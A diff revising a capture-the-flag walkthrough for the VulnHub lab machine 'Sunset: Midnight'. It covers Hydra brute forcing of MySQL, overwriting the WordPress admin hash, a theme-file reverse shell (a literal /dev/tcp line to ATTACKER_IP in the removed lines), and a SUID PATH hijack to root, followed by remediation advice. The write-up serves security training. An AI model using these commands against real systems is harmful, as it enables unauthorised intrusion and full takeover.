@@ -1,155 +1,187 @@
-# sunset: midnight — Writeup
+# Sunset: Midnight — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.10.178 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.10.178 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | /root/root.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/sunset-midnight,517/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/sunset-midnight-vulnhub-walkthrough/) |
+
+---
 
 ## Attack Summary
 
-nmap → WordPress site + `/etc/hosts` entry → Hydra MySQL brute → MySQL credential → overwrite WP admin password hash → PHP reverse shell via theme editor → `wp-config.php` creds → SSH as `jose` → SUID `/usr/bin/status` + strings PATH hijack → root
+Sunset: Midnight exposes a WordPress site paired with a directly accessible MySQL service. MySQL credentials are brute-forced with Hydra. Database access is used to overwrite the WordPress admin password hash, granting admin panel access. A PHP reverse shell injected into a theme file provides initial RCE. Credentials recovered from `wp-config.php` allow lateral movement to the user `jose`. A SUID binary (`/usr/bin/status`) calls `service` without an absolute path, enabling a PATH hijack to root.
+
+---
 
 ## Methodology
 
-1. Network discovery
-2. nmap + `/etc/hosts` setup
-3. MySQL brute-force with Hydra
-4. WordPress admin password hash overwrite via MySQL
-5. PHP reverse shell via theme editor
-6. Lateral movement to `jose` via `wp-config.php`
-7. SUID binary PATH hijack for root
+1. Host discovery and full-port nmap scan
+2. Hostname added to `/etc/hosts`
+3. WordPress site and login panel identified
+4. MySQL service brute-forced with Hydra
+5. WordPress admin password hash replaced via direct database access
+6. Theme file (`header.php`) modified with a PHP reverse shell
+7. Reverse shell caught with netcat
+8. `wp-config.php` credentials recovered and used to pivot to user `jose`
+9. SUID binary PATH hijack escalates to root
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Host Discovery and Port Scanning
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-```
-
----
-
-## Step 2: Port Scan and Setup
-
-```bash
+netdiscover -i eth0
 nmap -A -p- 192.168.10.178
 ```
 
-Add hostname to hosts file:
+Add the hostname to the hosts file as the machine's description requires:
 
 ```bash
-echo "192.168.10.178  sunset-midnight" >> /etc/hosts
+echo "192.168.10.178 sunset-midnight" >> /etc/hosts
 ```
 
-Ports found: 80 (HTTP/WordPress), 3306 (MySQL).
-
-![Nmap and initial recon](images/01-nmap.png)
+![Nmap scan](images/01-nmap.png)
 
 ---
 
-## Step 3: MySQL Brute-Force
+## Step 2: Web Enumeration
 
-```bash
-hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.10.178 mysql
-```
-
-MySQL root credentials recovered.
-
-![MySQL brute-force](images/02-mysql.png)
+Browse to `http://sunset-midnight`. A WordPress site is present. The standard login panel is reachable at `/wp-login.php`.
 
 ---
 
-## Step 4: Overwrite WordPress Admin Password
+## Step 3: MySQL Brute Force
 
-Connect to MySQL and update the admin password hash to MD5 of `123456`:
+MySQL is exposed and accepts remote connections. Brute force with Hydra:
 
 ```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt \
+  192.168.10.178 mysql
+```
+
+Recovered MySQL credentials are used in the next step.
+
+![MySQL brute force](images/02-mysql-brute.png)
+
+---
+
+## Step 4: Database Password Manipulation
+
+Connect to MySQL and overwrite the WordPress admin password hash with the MD5 of `123456`:
+
+```bash
+# MD5 of "123456" = e10adc3949ba59abbe56e057f20f883e
 mysql -u root -p<PASSWORD> -h 192.168.10.178
-use wordpress;
+
+USE wordpress;
 SELECT user_login, user_pass FROM wp_users;
-UPDATE wp_users SET user_pass=MD5('123456') WHERE user_login='admin';
+UPDATE wp_users SET user_pass='e10adc3949ba59abbe56e057f20f883e'
+  WHERE user_login='admin';
+EXIT;
 ```
 
 ---
 
-## Step 5: PHP Reverse Shell via Theme Editor
+## Step 5: WordPress Admin Access and Reverse Shell Injection
 
-Log in to `http://sunset-midnight/wp-admin/` as `admin:123456`.
+Log into the WordPress admin panel at `http://sunset-midnight/wp-login.php` with `admin:123456`.
 
-Navigate to **Appearance → Theme Editor → header.php** and inject a PHP reverse shell:
+Navigate to **Appearance > Theme Editor** and open `header.php`. Replace its content with a PentestMonkey PHP reverse shell configured for the attacker IP and port 4444.
 
-```php
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
-```
-
-Start listener and browse to the site:
+Start the listener on Kali:
 
 ```bash
 nc -nlvp 4444
-curl http://sunset-midnight/
 ```
 
-Shell received as `www-data`.
+Browse to `http://sunset-midnight` to trigger the modified `header.php`. A shell arrives as `www-data`.
 
-![WordPress PHP shell](images/03-wordpress.png)
+![WordPress shell injected and reverse shell received](images/03-wp-shell.png)
 
 ---
 
-## Step 6: Credential Discovery
+## Step 6: Lateral Movement via wp-config.php
+
+Stabilise the shell:
 
 ```bash
-cat /var/www/html/wordpress/wp-config.php
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
 ```
 
-Contains the password for user `jose`. Lateral move:
+Read the WordPress configuration file:
+
+```bash
+cat /var/www/html/wp-config.php
+```
+
+A password is present. Use it to switch to user `jose`:
 
 ```bash
 su jose
-# or: ssh jose@localhost
+# enter the recovered password
 ```
 
 ---
 
-## Step 7: SUID PATH Hijack for Root
+## Step 7: Privilege Escalation via PATH Hijack
+
+Inspect SUID binaries:
 
 ```bash
-find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+```
+
+`/usr/bin/status` is SUID root. Analyse it:
+
+```bash
 strings /usr/bin/status
 ```
 
-`/usr/bin/status` calls `service` without an absolute path.
+It calls `service` by relative name. Hijack PATH:
 
 ```bash
 echo '/bin/sh' > /tmp/service
 chmod +x /tmp/service
 export PATH=/tmp:$PATH
 /usr/bin/status
+```
+
+A root shell spawns.
+
+![PATH hijack and root shell](images/04-privesc.png)
+
+---
+
+## Step 8: Root Flag
+
+```bash
 id
 cat /root/root.txt
 ```
 
-![Privilege escalation](images/04-privesc.png)
-
-![Root flag](images/05-root.png)
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **MySQL exposed externally** with a brute-forceable root password is critical — bind MySQL to localhost only
-2. **WordPress admin panel access** → instant code execution via theme/plugin editor — restrict wp-admin by IP
-3. **wp-config.php credentials** reused for system users create a lateral movement path — use unique credentials
-4. **SUID binaries calling relative paths** are a reliable root vector — always use absolute paths in privileged code
+- Exposing MySQL directly to the network with a weak or default root password is a critical misconfiguration. Database servers should never be reachable from untrusted interfaces.
+- WordPress admin access alone is sufficient for code execution when theme file editing is not disabled.
+- Credentials in `wp-config.php` are frequently reused by system users, making them a high-value lateral movement target.
+- SUID binaries that invoke external commands by relative path are trivially exploitable through PATH manipulation.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| MySQL exposed externally | Bind to 127.0.0.1 in `my.cnf`; use firewall rules |
-| Weak MySQL root password | Strong password + restrict remote connections |
-| WP admin shell execution | Disable theme/plugin file editing (`DISALLOW_FILE_EDIT`) |
-| wp-config.php password reuse | Use unique DB credentials; restrict file permissions |
-| SUID binary relative PATH | Replace `service` calls with absolute path `/usr/sbin/service` |
+|---|---|
+| MySQL exposed with weak root password | Bind MySQL to localhost; use strong unique credentials |
+| WordPress admin password replaceable via direct DB access | Restrict MySQL network access; use parameterised credentials |
+| Theme file editing enabled in WordPress | Add `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php` |
+| Credentials in `wp-config.php` reused for OS accounts | Use dedicated DB service accounts; do not reuse passwords across layers |
+| SUID binary calling `service` by relative path | Use absolute paths in all SUID/privileged programs |
